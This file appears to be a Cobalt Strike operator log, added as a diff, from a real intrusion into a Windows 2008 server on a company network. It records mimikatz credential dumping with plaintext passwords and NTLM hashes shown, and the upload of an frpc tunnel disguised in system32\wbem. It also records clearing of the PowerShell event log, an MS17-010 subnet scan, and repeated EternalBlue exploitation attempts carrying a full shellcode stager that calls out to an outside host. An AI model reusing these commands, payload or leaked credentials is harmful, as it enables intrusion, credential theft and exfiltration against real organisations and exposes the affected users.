@@ -1,0 +1,1167 @@
+12/21 18:15:47 UTC [metadata] 219.135.130.158 <- 192.168.20.111; computer: OASYSTEM; user: Administrator *; process: dllhost.exe; pid: 3656; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+12/21 18:15:53 UTC [input] <niko> sleep 1
+12/21 18:15:53 UTC [task] <T1029> Tasked beacon to sleep for 1s
+12/21 18:15:59 UTC [input] <niko> shell whoami
+12/21 18:15:59 UTC [task] <T1059> Tasked beacon to run: whoami
+12/21 18:16:02 UTC [checkin] host called home, sent: 53 bytes
+12/21 18:16:02 UTC [output]
+received output:
+oasystem\administrator
+
+
+12/21 18:16:12 UTC [input] <niko> logonpasswords
+12/21 18:16:12 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+12/21 18:16:13 UTC [checkin] host called home, sent: 296058 bytes
+12/21 18:16:14 UTC [output]
+received output:
+
+Authentication Id : 0 ; 5228625 (00000000:004fc851)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : OASYSTEM
+Logon Server      : OASYSTEM
+Logon Time        : 2023/8/31 13:59:24
+SID               : S-1-5-21-4231912500-1674961211-2036398625-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 7386fef77ea0e854356b838ccfc6a39d
+	 * SHA1     : a6bad6fa8c7433912d86b9a4583fce1883dfb166
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * NTLM     : 7386fef77ea0e854356b838ccfc6a39d
+	 * SHA1     : a6bad6fa8c7433912d86b9a4583fce1883dfb166
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * Password : SYSTECchina3706
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : OASYSTEM
+	 * Password : (null)
+	ssp :	
+	 [00000000]
+	 * Username : zhouzy
+	 * Domain   : SYSTEC
+	 * Password : Javadf@2023
+	credman :	
+	 [00000000]
+	 * Username : SYSTEC\zhouzy
+	 * Domain   : nas.systec.com.cn
+	 * Password : Javadf@2023
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : OASYSTEM$
+Domain            : SYSTEC
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:27
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : OASYSTEM$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	kerberos :	
+	 * Username : oasystem$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:30
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 54869 (00000000:0000d655)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:43:01
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : OASYSTEM$
+Domain            : SYSTEC
+Logon Server      : (null)
+Logon Time        : 2023/8/31 9:42:58
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : OASYSTEM$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	kerberos :	
+	 * Username : oasystem$
+	 * Domain   : SYSTEC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+12/21 18:19:35 UTC [checkin] host called home, sent: 19 bytes
+12/21 18:19:59 UTC [input] <niko> upload C:\Users\Altria\Desktop\frpc.exe (C:\Windows\system32\wbem\frpc.exe)
+12/21 18:20:15 UTC [task] <> Tasked beacon to upload C:\Users\Altria\Desktop\frpc.exe as C:\Windows\system32\wbem\frpc.exe
+12/21 18:20:15 UTC [checkin] host called home, sent: 1046618 bytes
+12/21 18:20:16 UTC [indicator] file: 4eb5eb52061cc8cf06e28e7eb20cd055 11073536 bytes C:\Windows\system32\wbem\frpc.exe
+12/21 18:20:19 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:23 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:28 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:32 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:36 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:40 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:44 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:48 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:52 UTC [checkin] host called home, sent: 1040564 bytes
+12/21 18:20:57 UTC [checkin] host called home, sent: 663771 bytes
+12/21 18:22:17 UTC [input] <s09> shell start /b C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.dll
+12/21 18:22:17 UTC [task] <T1059> Tasked beacon to run: start /b C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.dll
+12/21 18:22:17 UTC [checkin] host called home, sent: 131 bytes
+12/21 18:22:19 UTC [checkin] host called home, sent: 20 bytes
+12/21 18:22:22 UTC [checkin] host called home, sent: 12 bytes
+12/21 18:22:24 UTC [checkin] host called home, sent: 20 bytes
+12/21 18:22:25 UTC [checkin] host called home, sent: 20 bytes
+12/21 18:22:25 UTC [error] could not open D:\*: 21
+12/21 18:22:31 UTC [input] <niko> download E:\result.txt
+12/21 18:22:31 UTC [task] <T1005> Tasked beacon to download E:\result.txt
+12/21 18:22:31 UTC [checkin] host called home, sent: 21 bytes
+12/21 18:22:31 UTC [output]
+started download of E:\result.txt (40628 bytes)
+
+12/21 18:22:31 UTC [output]
+download of result.txt is complete
+
+12/21 18:23:25 UTC [input] <s09> shell C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.dll
+12/21 18:23:25 UTC [task] <T1059> Tasked beacon to run: C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.dll
+12/21 18:23:25 UTC [checkin] host called home, sent: 102 bytes
+12/21 18:23:35 UTC [output]
+received output:
+2023/12/22 02:23:11 [I] [service.go:349] [f40394b6ed0ee4cd] login to server success, get run id [f40394b6ed0ee4cd], server udp port [0]
+2023/12/22 02:23:11 [I] [proxy_manager.go:144] [f40394b6ed0ee4cd] proxy added: [rrr10]
+2023/12/22 02:23:11 [W] [control.go:179] [f40394b6ed0ee4cd] [rrr10] start error: proxy name [rrr10] is already in use
+
+
+12/21 18:23:59 UTC [output]
+received output:
+2023/12/22 02:23:44 [W] [control.go:179] [f40394b6ed0ee4cd] [rrr10] start error: proxy name [rrr10] is already in use
+
+
+12/21 18:24:29 UTC [input] <s09> shell tasklist|findstr "frpc"
+12/21 18:24:29 UTC [task] <T1059> Tasked beacon to run: tasklist|findstr "frpc"
+12/21 18:24:29 UTC [checkin] host called home, sent: 54 bytes
+12/21 18:24:29 UTC [output]
+received output:
+frpc.exe                      4992                            2     15,672 K
+frpc.exe                      3848                            2     15,740 K
+
+
+12/21 18:24:32 UTC [output]
+received output:
+2023/12/22 02:24:17 [W] [control.go:179] [f40394b6ed0ee4cd] [rrr10] start error: proxy name [rrr10] is already in use
+
+
+12/21 18:24:43 UTC [input] <s09> shell kill -9 4992
+12/21 18:24:43 UTC [task] <T1059> Tasked beacon to run: kill -9 4992
+12/21 18:24:43 UTC [checkin] host called home, sent: 43 bytes
+12/21 18:24:43 UTC [output]
+received output:
+'kill' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+12/21 18:24:55 UTC [input] <s09> shell taskill -9 4992
+12/21 18:24:55 UTC [task] <T1059> Tasked beacon to run: taskill -9 4992
+12/21 18:24:56 UTC [checkin] host called home, sent: 46 bytes
+12/21 18:24:56 UTC [output]
+received output:
+'taskill' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+12/21 18:25:05 UTC [output]
+received output:
+2023/12/22 02:24:50 [W] [control.go:179] [f40394b6ed0ee4cd] [rrr10] start error: proxy name [rrr10] is already in use
+
+
+12/21 18:25:06 UTC [checkin] host called home, sent: 12 bytes
+12/21 18:25:20 UTC [input] <s09> kill 4992
+12/21 18:25:21 UTC [task] <> Tasked beacon to kill 4992
+12/21 18:25:21 UTC [checkin] host called home, sent: 36 bytes
+12/21 18:25:24 UTC [input] <s09> kill 3848
+12/21 18:25:24 UTC [task] <> Tasked beacon to kill 3848
+12/21 18:25:24 UTC [checkin] host called home, sent: 36 bytes
+12/21 18:28:00 UTC [input] <s09> shell start /b C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.txt
+12/21 18:28:00 UTC [task] <T1059> Tasked beacon to run: start /b C:\Windows\system32\wbem\frpc.exe -c C:\Windows\system32\wbem\wuapi.txt
+12/21 18:28:01 UTC [checkin] host called home, sent: 111 bytes
+12/21 18:31:13 UTC [output]
+-------------------------------------------------------------查询RDP端口-------------------------------------------------------------
+
+12/21 18:31:13 UTC [task] <T1086, T1064> Tasked beacon to import: D:\QYchanj\TOOLS\CS相关\CS插件\谢公子插件\CS插件\powershell\RegRdpPort.ps1
+12/21 18:31:13 UTC [task] <T1086, T1093> Tasked beacon to run: RegRdpPort (unmanaged)
+12/21 18:31:13 UTC [checkin] host called home, sent: 510 bytes
+12/21 18:31:14 UTC [task] <T1059> Tasked beacon to run: wevtutil cl "Windows PowerShell"
+12/21 18:31:15 UTC [checkin] host called home, sent: 134830 bytes
+12/21 18:31:18 UTC [output]
+received output:
+RDP-Tcp PortNumber:  51111
+
+
+12/21 18:31:29 UTC [output]
+-------------------------------------------------------------MS17010探测------------------------------------------------------------
+
+12/21 18:31:43 UTC [task] <T1093> Tasked beacon to run .NET program: Ladon.exe 192.168.20.0/24 MS17010
+12/21 18:31:44 UTC [checkin] host called home, sent: 989273 bytes
+12/21 18:31:57 UTC [output]
+received output:
+Ladon 6.6
+Start: 2023/12/22 2:31:41
+Runtime: .net 4.0  OS Arch: x64
+OS Name: Microsoft Windows Server 2008 R2 Enterprise 
+192.168.20.0/24
+load MS17010
+192.168.20.0/24 is Valid CIDR
+
+
+12/21 18:31:58 UTC [output]
+received output:
+IPCound: 256
+Scan Start: 2023/12/22 2:31:42
+192.168.20.11 WIN-PSLI8L6MUE4  [Win 2012 R2 Datacenter 9600]
+192.168.20.100 WIN-G5Q83ETG78N
+192.168.20.4 CITRIXDDC systec.com.cn [Win 2008 R2 Enterprise 7601 SP 1]
+192.168.20.25 MS17-010 NINGTON  [Win 2016 Essentials 14393]
+192.168.20.28 MS17-010 ADSSP  [Win 2008 R2 Enterprise 7601 SP 1]
+
+
+12/21 18:32:00 UTC [output]
+received output:
+192.168.20.33 rpa9.systec.com.cn
+192.168.20.36 ioa.systec.com.cn
+192.168.20.37 testioa.systec.com.cn
+
+
+12/21 18:32:19 UTC [output]
+-------------------------------------------------------------MS17010利用------------------------------------------------------------
+
+12/21 18:32:34 UTC [output]
+received output:
+192.168.20.31 qiyemis.systec.com.cn
+192.168.20.8 bi.systec.com.cn
+192.168.20.43 atrust.systec.com.cn
+192.168.20.26 token.systec.com.cn
+
+
+12/21 18:32:38 UTC [output]
+received output:
+192.168.20.111 OASYSTEM  [Win 2008 R2 Enterprise 7601 SP 1]
+192.168.20.197 RPA2012  [Win 2012 R2 Datacenter 9600]
+
+
+12/21 18:32:41 UTC [output]
+received output:
+192.168.20.198 rpa4.systec.com.cn
+
+
+12/21 18:32:42 UTC [task] <T1086, T1064> Tasked beacon to import: D:\SecTools\CS\Plugins\XiePlugin\powershell\Invoke-EternalBlue.ps1
+12/21 18:32:42 UTC [task] <T1086, T1093> Tasked beacon to run: Invoke-EternalBlue -Target 192.168.20.11 -Shellcode @(0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2d, 0x33, 0x2e, 0x33, 0x2e, 0x32, 0x2e, 0x73, 0x6c, 0x69, 0x6d, 0x2e, 0x6d, 0x69, 0x6e, 0x2e, 0x6a, 0x73, 0x00, 0x51, 0xb8, 0xbb, 0x16, 0xfa, 0xc8, 0xa8, 0x34, 0x1b, 0x64, 0x2c, 0x32, 0xfa, 0x62, 0x2e, 0xca, 0xad, 0x71, 0x74, 0x5c, 0xcd, 0x6f, 0x79, 0x4e, 0x57, 0xb5, 0xc1, 0x2f, 0xda, 0x9f, 0xaf, 0x6f, 0x6e, 0x8d, 0xdc, 0xe7, 0xa6, 0xa3, 0x89, 0x92, 0x39, 0x3e, 0x93, 0x8d, 0xba, 0xe9, 0xee, 0x6a, 0x77, 0x9a, 0x2a, 0x9d, 0xdd, 0x00, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x35, 0x0d, 0x0a, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x72, 0x3a, 0x20, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x6f, 0x64, 0x65, 0x2e, 0x6a, 0x71, 0x75, 0x65, 0x72, 0x79, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x31, 0x31, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x3b, 0x20, 0x78, 0x38, 0x36, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x31, 0x2e, 0x32, 0x36, 0x20, 0x28, 0x4b, 0x48, 0x54, 0x4d, 0x4c, 0x2c, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x29, 0x20, 0x43, 0x68, 0x72, 0x6f, 0x6d, 0x65, 0x2f, 0x39, 0x32, 0x2e, 0x30, 0x2e, 0x34, 0x36, 0x31, 0x35, 0x2e, 0x31, 0x31, 0x37, 0x20, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x31, 0x31, 0x0d, 0x0a, 0x00, 0x6b, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0xaf, 0x0f, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x38, 0x2e, 0x31, 0x33, 0x34, 0x2e, 0x38, 0x30, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x51, 0x09, 0xbf, 0x6d) -InitialGrooms 12 -MaxAttempts 5 (unmanaged)
+12/21 18:32:43 UTC [checkin] host called home, sent: 142949 bytes
+12/21 18:32:47 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+
+
+12/21 18:32:49 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/21 18:32:50 UTC [output]
+received output:
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:32:53 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:32:54 UTC [output]
+received output:
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:32:59 UTC [input] <niko> sleep 0
+12/21 18:32:59 UTC [task] <T1029> Tasked beacon to become interactive
+12/21 18:33:00 UTC [checkin] host called home, sent: 16 bytes
+12/21 18:33:00 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:33:02 UTC [output]
+received output:
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:33:09 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+
+
+12/21 18:33:10 UTC [output]
+received output:
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:33:17 UTC [output]
+received output:
+192.168.20.110 OASQL-TEST
+
+
+12/21 18:33:17 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:581 字符: 15
+ERROR: +     $sock.Send <<<< ($nt_trans_pkt) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+ERROR: 使用“1”个参数调用“Send”时发生异常:“远程主机强迫关闭了一个现有的连接。”
+ERROR: 所在位置 行:595 字符: 15
+ERROR: +     $sock.Send <<<< ($trans2_pkt_nulled) | out-null
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : DotNetMethodException
+ERROR:  
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail horribly
+VERBOSE: Send the payload with the grooms
+
+
+12/21 18:33:19 UTC [output]
+received output:
+=============================================
+OnlinePC:33
+Cidr Scan Finished!
+End: 2023/12/22 2:33:04
+
+
+12/21 18:33:38 UTC [output]
+-------------------------------------------------------------MS17010利用------------------------------------------------------------
+
+12/21 18:33:43 UTC [task] <T1086, T1064> Tasked beacon to import: D:\SecTools\CS\Plugins\XiePlugin\powershell\Invoke-EternalBlue.ps1
